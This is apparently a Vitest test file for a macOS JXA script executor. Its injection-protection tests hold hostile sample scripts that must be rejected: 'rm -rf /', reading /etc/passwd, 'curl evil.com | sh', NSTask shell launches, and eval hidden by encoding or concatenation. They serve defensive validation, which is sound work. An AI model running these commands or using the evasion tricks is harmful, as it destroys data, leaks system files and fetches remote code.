import { describe, it, expect, beforeEach, vi } from 'vitest';
import { EventEmitter } from 'events';
import { execFile } from 'child_process';
import { JXAExecutor, type JXAExecutionOptions, type JXAExecutionResult } from '../../src/adapters/macos/jxa-executor.js';

vi.mock('child_process');

// Mock ChildProcess with streams
class MockChildProcess extends EventEmitter {
  stdout = new EventEmitter();
  stderr = new EventEmitter();
  stdin = {
    write: vi.fn(),
    end: vi.fn(),
    on: vi.fn(),
  };

  constructor(private stdoutData: string, private stderrData: string, private exitCode: number) {
    super();
  }

  kill = vi.fn(() => {
    this.emit('exit', null);
  });

  simulateExecution() {
    if (this.stdoutData) {
      (this.stdout as any).emit('data', this.stdoutData);
    }
    if (this.stderrData) {
      (this.stderr as any).emit('data', this.stderrData);
    }
    this.emit('exit', this.exitCode);
  }
}

describe('JXAExecutor', () => {
  let executor: JXAExecutor;

  beforeEach(() => {
    executor = new JXAExecutor();
    vi.clearAllMocks();
  });

  it('should execute simple JXA script successfully', async () => {
    const mockProcess = new MockChildProcess('42\n', '', 0);
    vi.mocked(execFile).mockReturnValue(mockProcess as any);

    const promise = executor.execute('return 42');
    mockProcess.simulateExecution();
    const result = await promise;

    expect(result.stdout).toBe('42\n');
    expect(result.stderr).toBe('');
    expect(result.exitCode).toBe(0);
    expect(result.timedOut).toBe(false);
  });

  it('should capture stdout from script', async () => {
    const mockProcess = new MockChildProcess('Hello\n', '', 0);
    vi.mocked(execFile).mockReturnValue(mockProcess as any);

    const promise = executor.execute('return "Hello"');
    mockProcess.simulateExecution();
    const result = await promise;

    expect(result.stdout).toBe('Hello\n');
  });

  it('should capture stderr from script', async () => {
    const mockProcess = new MockChildProcess('', 'Error: Something went wrong\n', 1);
    vi.mocked(execFile).mockReturnValue(mockProcess as any);

    const promise = executor.execute('throw new Error("Something went wrong")');
    mockProcess.simulateExecution();
    const result = await promise;

    expect(result.stderr).toBe('Error: Something went wrong\n');
  });

  it('should call osascript with correct arguments', async () => {
    const mockProcess = new MockChildProcess('test\n', '', 0);
    vi.mocked(execFile).mockReturnValue(mockProcess as any);

    const script = 'return "test"';
    const promise = executor.execute(script);
    mockProcess.simulateExecution();
    await promise;

    expect(execFile).toHaveBeenCalledWith(
      'osascript',
      ['-l', 'JavaScript', '-'],
      expect.any(Object)
    );
  });

  it('should use default timeout when not specified', async () => {
    const mockProcess = new MockChildProcess('quick\n', '', 0);
    vi.mocked(execFile).mockReturnValue(mockProcess as any);

    const promise = executor.execute('return "quick"');
    mockProcess.simulateExecution();
    const result = await promise;

    expect(result.timedOut).toBe(false);
    expect(result.stdout).toBe('quick\n');

    // Check that timeout was set to default
    const callArgs = vi.mocked(execFile).mock.calls[0];
    expect(callArgs[2]?.timeout).toBe(30000);
  });

  it('should respect custom timeout option', async () => {
    const mockProcess = new MockChildProcess('result\n', '', 0);
    vi.mocked(execFile).mockReturnValue(mockProcess as any);

    const promise = executor.execute('return "result"', { timeoutMs: 5000 });
    mockProcess.simulateExecution();
    await promise;

    const callArgs = vi.mocked(execFile).mock.calls[0];
    expect(callArgs[2]?.timeout).toBe(5000);
  });

  it('should capture stderr by default', async () => {
    const mockProcess = new MockChildProcess('', 'warning\n', 0);
    vi.mocked(execFile).mockReturnValue(mockProcess as any);

    const promise = executor.execute('return "test"');
    mockProcess.simulateExecution();
    const result = await promise;

    expect(result.stderr).toBe('warning\n');
  });

  it('should handle errors with proper exit code', async () => {
    const mockProcess = new MockChildProcess('', 'execution error\n', 1);
    vi.mocked(execFile).mockReturnValue(mockProcess as any);

    const promise = executor.execute('invalid script');
    mockProcess.simulateExecution();
    const result = await promise;

    expect(result.exitCode).toBe(1);
    expect(result.stderr).toContain('execution error');
  });

  it('should handle syntax errors', async () => {
    const mockProcess = new MockChildProcess('', 'Error: Syntax Error: Unexpected token\n', 1);
    vi.mocked(execFile).mockReturnValue(mockProcess as any);

    const promise = executor.execute('invalid { syntax }');
    mockProcess.simulateExecution();
    const result = await promise;

    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toContain('Syntax Error');
  });

  it('should handle empty script', async () => {
    const mockProcess = new MockChildProcess('', '', 0);
    vi.mocked(execFile).mockReturnValue(mockProcess as any);

    const promise = executor.execute('');
    mockProcess.simulateExecution();
    const result = await promise;

    expect(result.exitCode).toBe(0);
  });

  it('should handle large output', async () => {
    const largeOutput = 'x'.repeat(100000) + '\n';
    const mockProcess = new MockChildProcess(largeOutput, '', 0);
    vi.mocked(execFile).mockReturnValue(mockProcess as any);

    const promise = executor.execute('return data');
    mockProcess.simulateExecution();
    const result = await promise;

    expect(result.stdout.length).toBeGreaterThan(50000);
  });

  it('should handle special characters in output', async () => {
    const specialOutput = 'Special: "quotes" \'apostrophes\' \\backslash\n';
    const mockProcess = new MockChildProcess(specialOutput, '', 0);
    vi.mocked(execFile).mockReturnValue(mockProcess as any);

    const promise = executor.execute('return data');
    mockProcess.simulateExecution();
    const result = await promise;

    expect(result.stdout).toContain('quotes');
    expect(result.stdout).toContain('apostrophes');
    expect(result.stdout).toContain('backslash');
  });

  describe('Command Injection Protection', () => {
    it('should reject script with "do shell script"', async () => {
      const maliciousScript = 'do shell script "rm -rf /"';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Shell command execution via AppleScript/
      );

      // Verify osascript was never called
      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with "do shell script" (case insensitive)', async () => {
      const maliciousScript = 'DO SHELL SCRIPT "cat /etc/passwd"';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Shell command execution via AppleScript/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with "do shell script" (extra whitespace)', async () => {
      const maliciousScript = 'do  shell  script  "whoami"';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Shell command execution via AppleScript/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with system.run()', async () => {
      const maliciousScript = 'system.run("/bin/sh", ["-c", "curl evil.com"])';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Process spawning via system\.run/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with system.run() (whitespace variations)', async () => {
      const maliciousScript = 'system.run  (  "/bin/bash"  )';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Process spawning via system\.run/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with ObjC.import("Foundation")', async () => {
      const maliciousScript = 'ObjC.import("Foundation"); var task = $.NSTask.alloc.init;';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Objective-C bridge to Foundation framework/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with ObjC.import("Foundation") (single quotes)', async () => {
      const maliciousScript = "ObjC.import('Foundation'); // malicious code";

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Objective-C bridge to Foundation framework/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with NSTask', async () => {
      const maliciousScript = 'var task = $.NSTask.alloc.init; task.setLaunchPath("/bin/sh");';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Process spawning via NSTask/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with NSAppleScript', async () => {
      const maliciousScript = 'var script = $.NSAppleScript.alloc.initWithSource("return 1");';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Nested AppleScript execution/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with @import "AppKit"', async () => {
      const maliciousScript = '@import "AppKit"; // UI manipulation';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*AppKit import/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with @import \'AppKit\'', async () => {
      const maliciousScript = "@import 'AppKit';";

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*AppKit import/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should allow safe JXA script with Application() calls', async () => {
      const safeScript = 'const app = Application("Finder"); app.activate();';
      const mockProcess = new MockChildProcess('', '', 0);
      vi.mocked(execFile).mockReturnValue(mockProcess as any);

      const promise = executor.execute(safeScript);
      mockProcess.simulateExecution();
      const result = await promise;

      expect(result.exitCode).toBe(0);
      expect(execFile).toHaveBeenCalled();
    });

    it('should allow safe JXA script with return values', async () => {
      const safeScript = 'return 42 + 8';
      const mockProcess = new MockChildProcess('50\n', '', 0);
      vi.mocked(execFile).mockReturnValue(mockProcess as any);

      const promise = executor.execute(safeScript);
      mockProcess.simulateExecution();
      const result = await promise;

      expect(result.stdout).toBe('50\n');
      expect(execFile).toHaveBeenCalled();
    });

    it('should allow safe JXA script with JSON serialization', async () => {
      const safeScript = 'JSON.stringify({name: "test", value: 123})';
      const mockProcess = new MockChildProcess('{"name":"test","value":123}\n', '', 0);
      vi.mocked(execFile).mockReturnValue(mockProcess as any);

      const promise = executor.execute(safeScript);
      mockProcess.simulateExecution();
      const result = await promise;

      expect(result.stdout).toContain('test');
      expect(execFile).toHaveBeenCalled();
    });

    it('should allow safe script with string containing "shell" in other contexts', async () => {
      const safeScript = 'return "I found a shell on the beach"';
      const mockProcess = new MockChildProcess('I found a shell on the beach\n', '', 0);
      vi.mocked(execFile).mockReturnValue(mockProcess as any);

      const promise = executor.execute(safeScript);
      mockProcess.simulateExecution();
      const result = await promise;

      expect(result.stdout).toContain('shell');
      expect(execFile).toHaveBeenCalled();
    });

    it('should detect injection attempt in complex multiline script', async () => {
      const maliciousScript = `
        const app = Application("Finder");
        app.activate();
        // Looks innocent so far...
        do shell script "curl evil.com | sh"
        return "Done";
      `;

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should detect injection attempt with commented dangerous code (still fails)', async () => {
      const maliciousScript = `
        // This is a comment: do shell script "harmless"
        return 42;
      `;

      // Note: Our validator intentionally catches patterns even in comments
      // This is a security-first approach (better false positive than false negative)
      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    // NEW TESTS: eval() detection
    it('should reject script with eval() call', async () => {
      const maliciousScript = 'eval("malicious code")';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Dynamic code execution via eval/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with eval() (case insensitive)', async () => {
      const maliciousScript = 'EVAL("code")';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Dynamic code execution via eval/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with eval() in expression', async () => {
      const maliciousScript = 'const result = eval("return " + userInput)';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Dynamic code execution via eval/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    // NEW TESTS: Function() constructor detection
    it('should reject script with Function() constructor', async () => {
      const maliciousScript = 'const fn = Function("return malicious code")()';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Dynamic code execution via Function constructor/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with Function() (case variations)', async () => {
      const maliciousScript = 'const fn = new Function("x", "return x * 2")';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Dynamic code execution via Function constructor/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    // NEW TESTS: Template literal detection
    it('should reject script with template literal expression', async () => {
      const maliciousScript = 'const cmd = `execute ${userInput}`';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Template literal with expression/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with complex template literal', async () => {
      const maliciousScript = 'const result = `${eval("dangerous")}`';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should allow simple template literals without expressions', async () => {
      const safeScript = 'return "safe template"';
      const mockProcess = new MockChildProcess('safe template\n', '', 0);
      vi.mocked(execFile).mockReturnValue(mockProcess as any);

      const promise = executor.execute(safeScript);
      mockProcess.simulateExecution();
      const result = await promise;

      expect(result.exitCode).toBe(0);
      expect(execFile).toHaveBeenCalled();
    });

    // NEW TESTS: Base64 encoding detection
    it('should reject script with atob() (base64 decode)', async () => {
      const maliciousScript = 'const decoded = atob("ZG8gc2hlbGwgc2NyaXB0")';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Base64 decoding/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with btoa() (base64 encode)', async () => {
      const maliciousScript = 'const encoded = btoa("malicious payload")';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Base64 encoding/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    // NEW TESTS: Escape sequence detection
    it('should reject script with hex escape sequences', async () => {
      const maliciousScript = 'const cmd = "\\x65\\x76\\x61\\x6c"'; // "eval" in hex

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Hex escape sequence/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with unicode escape sequences', async () => {
      const maliciousScript = 'const cmd = "\\u0065\\u0076\\u0061\\u006c"'; // "eval" in unicode

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Unicode escape sequence/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with octal escape sequences', async () => {
      const maliciousScript = 'const cmd = "\\145\\166\\141\\154"'; // "eval" in octal

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Octal escape sequence/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    // NEW TESTS: Control character detection
    it('should reject script with null byte', async () => {
      const maliciousScript = 'const cmd = "safe\x00malicious"';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Null byte/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with control characters', async () => {
      const maliciousScript = 'const cmd = "command\x01injection"';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Control character/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    // NEW TESTS: Comment-based obfuscation
    it('should reject script with suspicious block comment', async () => {
      const maliciousScript = '/* hidden eval() call */ return 42';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with suspicious line comment containing eval', async () => {
      const maliciousScript = '// This uses eval() to do something\nreturn 42';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with suspicious line comment containing Function', async () => {
      const maliciousScript = '// Using Function constructor here\nreturn 42';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Suspicious pattern in line comment/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    // NEW TESTS: String concatenation attacks
    it('should reject script building eval via string concatenation', async () => {
      const maliciousScript = 'const fn = "ev" + "al"; window[fn]("code")';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*String concatenation building "eval"/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script building shell command via concatenation', async () => {
      const maliciousScript = 'const cmd = "do " + "shell" + " script"';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*String concatenation building "do shell"/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script building Function via string concatenation', async () => {
      const maliciousScript = 'const ctor = "Func" + "tion"; window[ctor]("return 1")';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*String concatenation building "Function"/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    // NEW TESTS: Dynamic property access
    it('should reject script with dynamic eval access', async () => {
      const maliciousScript = 'const fn = window["eval"]; fn("code")';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Dynamic property access to dangerous function/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with dynamic Function access', async () => {
      const maliciousScript = 'const Fn = window["Function"]; new Fn("return 1")';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected.*Dynamic property access to dangerous function/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    // TESTS: Verify safe scripts still work
    it('should allow safe script with "evaluate" (not eval)', async () => {
      const safeScript = 'return "I will evaluate this later"';
      const mockProcess = new MockChildProcess('I will evaluate this later\n', '', 0);
      vi.mocked(execFile).mockReturnValue(mockProcess as any);

      const promise = executor.execute(safeScript);
      mockProcess.simulateExecution();
      const result = await promise;

      expect(result.exitCode).toBe(0);
      expect(execFile).toHaveBeenCalled();
    });

    it('should allow safe script with normal string operations', async () => {
      const safeScript = 'const name = "hello"; const greeting = "Hi " + name; return greeting';
      const mockProcess = new MockChildProcess('Hi hello\n', '', 0);
      vi.mocked(execFile).mockReturnValue(mockProcess as any);

      const promise = executor.execute(safeScript);
      mockProcess.simulateExecution();
      const result = await promise;

      expect(result.exitCode).toBe(0);
      expect(execFile).toHaveBeenCalled();
    });

    it('should allow safe script with Array/Object methods', async () => {
      const safeScript = 'const arr = [1,2,3]; return arr.map(x => x * 2)';
      const mockProcess = new MockChildProcess('[2,4,6]\n', '', 0);
      vi.mocked(execFile).mockReturnValue(mockProcess as any);

      const promise = executor.execute(safeScript);
      mockProcess.simulateExecution();
      const result = await promise;

      expect(result.exitCode).toBe(0);
      expect(execFile).toHaveBeenCalled();
    });

    // TESTS: Combined attack vectors
    it('should reject combined attack with eval in template literal', async () => {
      const maliciousScript = 'const result = `${eval("process.exit(0)")}`';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject hex-encoded eval attempt', async () => {
      const maliciousScript = 'const dangerous = "\\x65val"; window[dangerous]("code")';

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected/
      );

      expect(execFile).not.toHaveBeenCalled();
    });

    it('should reject script with multiple injection vectors', async () => {
      const maliciousScript = `
        const encoded = atob("ZXZhbA==");
        const fn = Function("return malicious");
        const template = \`execute \${encoded}\`;
      `;

      await expect(executor.execute(maliciousScript)).rejects.toThrow(
        /Command injection attempt detected/
      );

      expect(execFile).not.toHaveBeenCalled();
    });
  });
});
